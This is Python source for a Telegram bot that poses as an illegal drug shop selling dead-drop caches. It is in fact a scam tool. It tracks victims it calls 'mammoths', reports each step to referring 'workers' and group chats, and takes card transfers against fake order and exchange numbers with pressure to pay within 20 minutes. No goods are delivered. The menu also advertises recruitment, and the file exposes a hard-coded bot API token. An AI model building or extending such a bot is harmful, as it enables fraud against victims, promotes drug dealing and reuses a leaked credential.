from random import randint

from aiogram import Dispatcher, Bot, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import logging

from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from sqlalchemy import func

from db_stuff_drug import Customers, Goods, BASE_DIR
from db_stuff import session, Cards, User
from main import bot as main_bot

API_TOKEN = '6854328045:AAGuDPv7xHklBGn7a-2kjzy1kwLQKp1hpx8'

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message):
    username = message.from_user.username
    user_id = message.from_user.id
    tp = session.query(User.tg_id).filter(User.status == 2).first()
    try:
        referral_id = int(message.text.replace('/start ', ''))
        is_cust = session.query(Customers).filter(Customers.mammoth == username, Customers.worker_id == referral_id).count()
    except:
        is_cust = 1


    if is_cust == 0:
        referral_id = int(message.text.replace('/start ', ''))
        cust = Customers(tg_id_mammoth=user_id, mammoth=username, worker_id=referral_id)
        session.add(cust)
        session.commit()
        worker = session.query(User.username).filter(User.tg_id == referral_id).first()
        main_bot.send_message(
            text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
            chat_id=referral_id)

        try:
            main_bot.send_message(
                text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
                chat_id=tp)
        except:
            pass

        main_bot.send_message(
            text=f"Пришел новый мамонт!\nusername: @{username}\nВоркер: @{worker}",
            chat_id="-1002014887503")

        await bot.send_message(
            text=f"🌏 Добро пожаловать в бота, {username}! Вам необходимо ввести город для дальнейшей работы!🌍",
            chat_id=user_id)

    else:
        cust = session.query(Customers).filter(Customers.tg_id_mammoth == user_id).first()
        print(cust)
        worker = session.query(User.username).filter(User.tg_id == cust.worker_id).first()
        print(worker)
        await main_bot.send_message(
            text=f"Мамонт перезашел в бота!\nusername: @{username}\nВоркер: @{worker[0]}",
            chat_id=cust.worker_id)
        await main_menu(user_id)


@dp.message_handler(lambda message: message.text)
async def get_city(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == user_id).order_by(Customers.id.desc()).first()
    worker = session.query(User.username).filter(User.tg_id == cust.worker_id).first()
    cust.city = message.text
    tp = session.query(User.tg_id).filter(User.status == 2).first()
    await main_bot.send_message(
        text=f"Мамонт выбрал город: {cust.city}!\nusername: @{username}\nВоркер: @{worker[0]}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"Мамонт выбрал город: {cust.city}!\nusername: @{username}\nВоркер: @{worker[0]}",
            chat_id=tp)
    except:
        pass

    session.add(cust)
    session.commit()
    await bot.send_message(
        text=f"💊 Город успешно задан! Добро пожаловать в мир радости! 🍬",
        chat_id=user_id)
    await main_menu(user_id)


@dp.callback_query_handler(lambda c: c.data == 'central')
async def central(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == "central")
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='🏬 Сладости в центре города 🏬', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == 'outskirts')
async def outskirts(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == "outskirts")
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='🛣 Стафф на окраине города 🛣', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == '2km')
async def two_km(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == '2km')
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='🚲 Стафф в 2± км от города 🚲', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == '5km')
async def five_km(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == '5km')
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='🚲 Стафф в 5± км от города 🚲', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('item'))
async def item(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    item_id = int(callback_query.data[int(str(callback_query.data).find('item')) + 4:])
    item = session.query(Goods).filter(Goods.id == item_id).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    if '🧲' in item.name:
        keyboard_markup.add(InlineKeyboardButton(f'Купить магнит 🧲 {item.price}', callback_data=f'buyitem{item.id}'))
    if '🚪' in item.name:
        keyboard_markup.add(
            InlineKeyboardButton(f'Купить тайник в подъезде 🚪 {item.price}', callback_data=f'buyitem{item.id}'))
    if '🪨' in item.name:
        keyboard_markup.add(
            InlineKeyboardButton(f'Купить камень (не в снегу) 🪨 {item.price}', callback_data=f'buyitem{item.id}'))

    text = f'🛍 Информация о товаре: {item.name} 🛍\n' \
           f'Стоимость: {item.price} руб. (с учетом коммисии нашего обменника)\n\n' \
           f'После покупки вы получаете: фото и видео заклада, координаты, описание местности и адрес.\n ' \
           f'Для оформления нажмите на кнопку для покупки :)'

    await bot.send_message(text=text, chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('buyitem'))
async def buyitem(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    item_id = int(callback_query.data[int(str(callback_query.data).find('buyitem')) + 7:])
    item = session.query(Goods).filter(Goods.id == item_id).first()
    card = session.query(Cards).filter(Cards.country == 'рус').order_by(Cards.id.desc()).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    keyboard_markup.add(InlineKeyboardButton(f'Я оплатил ✅', callback_data=f'payid_{int(item.price)}'))
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == int(user_id)).first()
    worker = session.query(User).filter(User.tg_id == cust.worker_id).first()

    await main_bot.send_message(
        text=f"Мамонт на этапе оплаты!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"Мамонт на этапе оплаты!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
            chat_id=tp.tg_id)
        tpp = tp.username
    except:
        tpp = None
        pass

    text = f"""🛍 Номер заказа: SPPM-{randint(10000, 99999)} 🛍
    Код доступа: {randint(10000, 99999)}
    Номер заявки обменника: {randint(100000, 500000)}
    
    ВНИМАНИЕ! Переводите РОВНО указанную сумму! Ни больше, ни меньше!
    
    💸 Переведите (ровно эту сумму): {item.price} руб 💸
    💳 На номер карты: {card.numbers} 💳
    
    🕐 Перевод нужно сделать в течении 20 мин. 🕐
    
    Прочитайте перед оплатой:
    
    1. Вы должны перевести ровно указанную сумму (не больше и не меньше), иначе ваш платеж зачислен не будет!. При переводе не точной суммы вы можете оплатить чужой заказ и потерять средства.
    
    2. Делайте перевод одним платежом, если вы разобьете платеж на несколько, ваш платеж зачислен не будет!
    
    3. 🕐 Перевод нужно осуществить в течении 20 мин. 🕐 После создания заказа. Если вам не хватает времени, отмените заявку и создайте новую!
    
    4. Если у вас возникли какие-либо проблемы с оплатой, обратитесь в поддержку (контакты: @{tpp}) и перешлите туда это сообщение.
    
    5. Если вы оплатили, нажмите на кнопку "Я оплатил ✅"
    """

    await bot.send_message(text=text, chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('payid_'))
async def payid(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    profit = int(callback_query.data[int(str(callback_query.data).find('payid_')) + 6:])
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == int(user_id)).order_by(Customers.id.desc()).first()
    worker = session.query(User).filter(User.tg_id == cust.worker_id).first()
    await main_bot.send_message(
        text=f"Мамонт объявил об оплате {profit}р!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"Мамонт объявил об оплате {profit}р!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
            chat_id=tp)
    except:
        pass

    await main_bot.send_message(
        text=f"Мамонт объявил об оплате {profit}р!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
        chat_id="-1002063632581")

    await main_bot.send_message(
        text=f"Мамонт объявил об оплате {profit}р!\nusername: @{cust.mammoth}\nВоркер: @{worker.username}",
        chat_id="-1002014887503")

    await bot.send_message(text='Отлично! Мы сейчас проверим транзакцию 🔎 и выдадим адрес как можно скорее. Если ответа'
                                ' долго нет, отправьте чек в нашу Тех. Поддержку 💖👤', chat_id=user_id)


@dp.callback_query_handler(lambda c: c.data == 'history')
async def history(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(text='Вы пока ничего не покупали!', chat_id=user_id)


@dp.callback_query_handler(lambda c: c.data == 'bonus')
async def bonus(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(text='Мы активируем купоны автоматически при каждой 3 покупке! 😱💝🥴 Купоны от 5% до 15 %, '
                                'а так же мы их выдаем за приглащенных друзей! 👯‍♀️👯‍♀️', chat_id=user_id)


async def main_menu(chat_id):
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    keyboard_markup.add(InlineKeyboardButton('📍 Центр города 📍', callback_data='central'))
    keyboard_markup.add(InlineKeyboardButton('📍 Окраина города 📍', callback_data='outskirts'))
    keyboard_markup.add(InlineKeyboardButton('📍 До 2± км от города 📍', callback_data='2km'))
    keyboard_markup.add(InlineKeyboardButton('📍 До 5± км от города 📍', callback_data='5km'))
    keyboard_markup.add(InlineKeyboardButton('Тех. Поддержка', url=f'https://t.me/{tp.username}'))
    keyboard_markup.add(InlineKeyboardButton('🛍 История покупок 🛍', callback_data='history'))
    keyboard_markup.add(InlineKeyboardButton('🎁 Про скидки 🎁', callback_data='bonus'))
    keyboard_markup.add(InlineKeyboardButton('Трудоустройсво по залогу', url=f'https://t.me/{tp.username}'))
    keyboard_markup.add(InlineKeyboardButton('Трудоустройсво по документам', url=f'https://t.me/{tp.username}'))
    image_path = f'{BASE_DIR}\\images\\menu.jpg'
    print(image_path)
    with open(image_path, 'rb') as photo:
        await bot.send_photo(chat_id, photo, caption='Главное меню 💊💉', reply_markup=keyboard_markup)

if __name__ == '__main__':
    from aiogram import executor

    executor.start_polling(dp, skip_updates=True)